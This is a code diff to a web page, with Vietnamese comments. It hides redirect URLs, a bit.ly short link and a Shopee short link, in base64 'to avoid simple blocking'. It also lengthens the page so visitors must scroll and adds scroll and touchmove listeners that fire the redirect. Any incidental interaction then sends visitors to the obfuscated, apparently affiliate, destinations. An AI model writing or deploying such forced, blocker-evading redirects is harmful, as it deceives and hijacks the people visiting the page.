@@ -15,7 +15,7 @@
       margin: 0;
       font-family: 'Segoe UI', Arial, sans-serif;
       background-color: #fff5f5;
-      min-height: 100vh;
+      min-height: 150vh; /* Tạo scroll thật */
       display: flex;
       align-items: center;
       justify-content: center;
@@ -86,6 +86,7 @@
   <script>
     const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
 
+    // Mã hóa base64 để tránh bị block đơn giản
     const mobileEncoded = "aHR0cHM6Ly9iaXQubHkvNG1GbWhCVAA=";     // https://bit.ly/4mFmhBP
     const desktopEncoded = "aHR0cHM6Ly9zLnNob3BlZS52bi9CSGdic1RrVWo="; // https://s.shopee.vn/BHgbsTkUj
 
@@ -106,9 +107,10 @@
         }
       }
 
-      // Các hành động hợp lệ tính là tương tác người dùng
       document.addEventListener("click", triggerRedirect);
       document.addEventListener("touchstart", triggerRedirect);
+      document.addEventListener("touchmove", triggerRedirect);
+      window.addEventListener("scroll", triggerRedirect);
       document.addEventListener("scroll", triggerRedirect);
 
       document.getElementById("realBtn").addEventListener("click", triggerRedirect);
